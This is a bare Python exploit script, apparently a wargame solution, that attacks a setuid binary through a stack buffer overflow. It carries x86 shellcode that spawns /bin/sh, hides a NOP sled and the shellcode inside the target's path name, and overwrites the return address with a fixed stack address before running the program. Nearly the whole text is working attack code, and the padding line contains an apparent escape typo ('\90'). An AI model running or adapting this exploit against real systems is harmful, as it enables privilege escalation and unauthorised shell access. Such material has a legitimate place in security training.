import os
from struct import *

p = lambda x : pack("<L", x)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"

target = "/home/orge" + "\x90"*200+shellcode+"/../../../troll"
ret = 0xbffffa60
limit = 44


payload = "\90"*44+p(ret)
os.execv(target,[target,payload])   